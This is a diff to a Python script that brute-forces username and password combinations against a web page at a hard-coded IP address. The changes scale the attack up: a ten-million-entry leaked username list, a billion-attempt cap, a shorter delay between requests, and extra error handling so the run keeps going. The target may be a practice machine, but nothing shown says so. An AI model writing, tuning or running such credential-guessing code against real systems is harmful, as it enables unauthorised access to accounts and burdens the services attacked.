@@ -13,7 +13,7 @@ script_directory = os.path.dirname(os.path.abspath(__file__))
 url = "http://54.206.178.157:8084/classified.html"
 
 # Path to the file containing usernames in the same directory as the script
-usernames_filename = "usernames.txt"
+usernames_filename = "xato-net-10-million-usernames-dup.txt"
 usernames_file_path = os.path.join(script_directory, usernames_filename)
 
 # Path to the file containing passwords in the same directory as the script
@@ -52,7 +52,7 @@ output_filename = os.path.join(output_directory, f"{current_time}.txt")
 attempt_number = 0
 
 # Limit total number of attempts
-max_attempts = 10000
+max_attempts = 1000000000
 
 # Read usernames from the file
 with open(usernames_file_path, "r") as usernames_file:
@@ -100,5 +100,8 @@ for username in usernames:
         except (requests.exceptions.ConnectionError, http.client.RemoteDisconnected, urllib3.exceptions.ProtocolError) as e:
             print(f"Attempt {attempt_number}: Connection error occurred: {e}. Continuing...")
         
+        except requests.exceptions.ChunkedEncodingError as e:
+            print(f"Attempt {attempt_number}: ChunkedEncodingError occurred: {e}. Continuing...")
+            
         # Introduce a delay of 1 second between requests
-        time.sleep(1)
+        time.sleep(0.5)
